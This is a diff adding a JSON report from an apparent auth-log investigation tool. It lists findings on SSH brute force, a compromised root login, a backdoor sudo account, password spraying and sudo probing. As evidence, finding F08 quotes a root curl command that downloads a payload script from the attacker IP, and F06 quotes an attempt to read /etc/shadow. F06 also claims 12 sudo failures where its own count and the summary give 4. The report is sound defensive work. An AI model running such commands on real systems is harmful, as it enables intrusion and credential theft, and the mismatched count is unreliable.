@@ -1,0 +1,353 @@
+{
+  "tool": "auth_investigator",
+  "version": "1.0",
+  "generated": "2026-09-15 01:26:43",
+  "log": "data/auth.log",
+  "summary": {
+    "total_events": 135,
+    "time_range": [
+      "2026-09-13 22:16:00",
+      "2026-09-14 11:11:00"
+    ],
+    "by_type": {
+      "ssh_ok": 26,
+      "other": 20,
+      "sudo_ok": 3,
+      "ssh_invalid_user": 24,
+      "ssh_fail": 55,
+      "useradd": 1,
+      "usermod": 1,
+      "sudo_fail": 4,
+      "su_attempt": 1
+    },
+    "top_source_ips": [
+      [
+        "203.0.113.45",
+        46
+      ],
+      [
+        "198.51.100.77",
+        32
+      ],
+      [
+        "192.0.2.14",
+        5
+      ],
+      [
+        "192.0.2.44",
+        2
+      ],
+      [
+        "192.0.2.32",
+        2
+      ]
+    ],
+    "successful_logins_by_user": [
+      [
+        "deploy",
+        9
+      ],
+      [
+        "ops",
+        8
+      ],
+      [
+        "priya",
+        5
+      ],
+      [
+        "arjun",
+        3
+      ],
+      [
+        "root",
+        1
+      ]
+    ]
+  },
+  "findings": [
+    {
+      "id": "F03",
+      "severity": "CRITICAL",
+      "title": "Successful login after failure burst (likely compromised credential)",
+      "source_ip": "203.0.113.45",
+      "users": [
+        "admin",
+        "root"
+      ],
+      "first_seen": "2026-09-14 00:05:01",
+      "last_seen": "2026-09-14 00:06:42",
+      "event_count": 38,
+      "evidence_lines": [
+        27,
+        28,
+        29,
+        30,
+        31,
+        33,
+        34,
+        35,
+        36,
+        37,
+        39,
+        40,
+        41,
+        42,
+        43,
+        45,
+        46,
+        47,
+        48,
+        49,
+        51,
+        52,
+        53,
+        54,
+        55
+      ],
+      "mitre_attack": "T1078 Valid Accounts",
+      "detail": "'root' accepted via password from 203.0.113.45 after 37 failures in the preceding 10 min. Treat the account and host as compromised until proven otherwise."
+    },
+    {
+      "id": "F10",
+      "severity": "CRITICAL",
+      "title": "Account added to privileged group",
+      "source_ip": "local",
+      "users": [
+        "svc_backup"
+      ],
+      "first_seen": "2026-09-14 00:09:02",
+      "last_seen": "2026-09-14 00:09:02",
+      "event_count": 1,
+      "evidence_lines": [
+        74
+      ],
+      "mitre_attack": "T1098 Account Manipulation",
+      "detail": "'svc_backup' added to 'sudo' \u2014 backdoor admin pattern."
+    },
+    {
+      "id": "F01",
+      "severity": "HIGH",
+      "title": "SSH brute force (many failures from one source)",
+      "source_ip": "203.0.113.45",
+      "users": [
+        "admin",
+        "root"
+      ],
+      "first_seen": "2026-09-14 00:05:01",
+      "last_seen": "2026-09-14 00:06:39",
+      "event_count": 37,
+      "evidence_lines": [
+        27,
+        28,
+        29,
+        30,
+        31,
+        33,
+        34,
+        35,
+        36,
+        37,
+        39,
+        40,
+        41,
+        42,
+        43,
+        45,
+        46,
+        47,
+        48,
+        49,
+        51,
+        52,
+        53,
+        54,
+        55
+      ],
+      "mitre_attack": "T1110.001 Password Guessing",
+      "detail": "37 failed passwords in 1.6 min (22.7/min); primary target 'root' (29 attempts)."
+    },
+    {
+      "id": "F09",
+      "severity": "HIGH",
+      "title": "New local account created",
+      "source_ip": "local",
+      "users": [
+        "svc_backup"
+      ],
+      "first_seen": "2026-09-14 00:08:42",
+      "last_seen": "2026-09-14 00:08:42",
+      "event_count": 1,
+      "evidence_lines": [
+        73
+      ],
+      "mitre_attack": "T1136.001 Create Account: Local",
+      "detail": "Account 'svc_backup' created \u2014 verify against change tickets."
+    },
+    {
+      "id": "F08",
+      "severity": "HIGH",
+      "title": "Privileged command fetched/staged a remote payload",
+      "source_ip": "local",
+      "users": [
+        "root"
+      ],
+      "first_seen": "2026-09-14 00:09:42",
+      "last_seen": "2026-09-14 00:09:42",
+      "event_count": 1,
+      "evidence_lines": [
+        75
+      ],
+      "mitre_attack": "T1105 Ingress Tool Transfer",
+      "detail": "'root' ran as root: /usr/bin/curl -s http://203.0.113.45/x.sh -o /tmp/x.sh"
+    },
+    {
+      "id": "F02",
+      "severity": "HIGH",
+      "title": "Password spraying (one source, many accounts)",
+      "source_ip": "198.51.100.77",
+      "users": [
+        "alice",
+        "bob",
+        "carol",
+        "dave",
+        "erin",
+        "frank",
+        "grace",
+        "heidi",
+        "ivan",
+        "judy",
+        "mallory",
+        "oscar",
+        "peggy",
+        "trent",
+        "victor",
+        "walter"
+      ],
+      "first_seen": "2026-09-14 01:40:33",
+      "last_seen": "2026-09-14 01:49:19",
+      "event_count": 16,
+      "evidence_lines": [
+        88,
+        90,
+        92,
+        94,
+        96,
+        98,
+        100,
+        102,
+        104,
+        108,
+        110,
+        112,
+        114,
+        116,
+        118,
+        120
+      ],
+      "mitre_attack": "T1110.003 Password Spraying",
+      "detail": "16 failures across 16 distinct usernames, max 1 attempt(s) per user \u2014 the signature of spraying a single password against a user list to stay under lockout thresholds."
+    },
+    {
+      "id": "F06",
+      "severity": "HIGH",
+      "title": "Repeated failed sudo (local privilege-escalation probing)",
+      "source_ip": "local",
+      "users": [
+        "arjun"
+      ],
+      "first_seen": "2026-09-14 09:00:15",
+      "last_seen": "2026-09-14 09:01:00",
+      "event_count": 4,
+      "evidence_lines": [
+        124,
+        125,
+        126,
+        127
+      ],
+      "mitre_attack": "T1548.003 Sudo and Sudo Caching",
+      "detail": "'arjun' failed sudo 12 times; last command attempted: /bin/cat /etc/shadow"
+    },
+    {
+      "id": "F04",
+      "severity": "MEDIUM",
+      "title": "Privileged account login outside business hours",
+      "source_ip": "203.0.113.45",
+      "users": [
+        "root"
+      ],
+      "first_seen": "2026-09-14 00:06:42",
+      "last_seen": "2026-09-14 00:06:42",
+      "event_count": 1,
+      "evidence_lines": [
+        71
+      ],
+      "mitre_attack": "T1078 Valid Accounts",
+      "detail": "'root' logged in at 00:06 (allowed window 08:00\u201320:00)."
+    },
+    {
+      "id": "F05",
+      "severity": "MEDIUM",
+      "title": "Username enumeration / invalid-user probing",
+      "source_ip": "198.51.100.77",
+      "users": [
+        "alice",
+        "bob",
+        "carol",
+        "dave",
+        "erin",
+        "frank",
+        "grace",
+        "heidi",
+        "ivan",
+        "judy",
+        "mallory",
+        "oscar",
+        "peggy",
+        "trent",
+        "victor",
+        "walter"
+      ],
+      "first_seen": "2026-09-14 01:40:33",
+      "last_seen": "2026-09-14 01:49:19",
+      "event_count": 16,
+      "evidence_lines": [
+        87,
+        89,
+        91,
+        93,
+        95,
+        97,
+        99,
+        101,
+        103,
+        107,
+        109,
+        111,
+        113,
+        115,
+        117,
+        119
+      ],
+      "mitre_attack": "T1087 Account Discovery",
+      "detail": "16 non-existent usernames tried: alice, bob, carol, dave, erin, frank, grace, heidi\u2026."
+    },
+    {
+      "id": "F07",
+      "severity": "MEDIUM",
+      "title": "su to root attempted",
+      "source_ip": "local",
+      "users": [
+        "arjun"
+      ],
+      "first_seen": "2026-09-14 09:30:00",
+      "last_seen": "2026-09-14 09:30:00",
+      "event_count": 1,
+      "evidence_lines": [
+        128
+      ],
+      "mitre_attack": "T1548 Abuse Elevation Control Mechanism",
+      "detail": "'arjun' attempted 'su root' on pts/1."
+    }
+  ]
+}
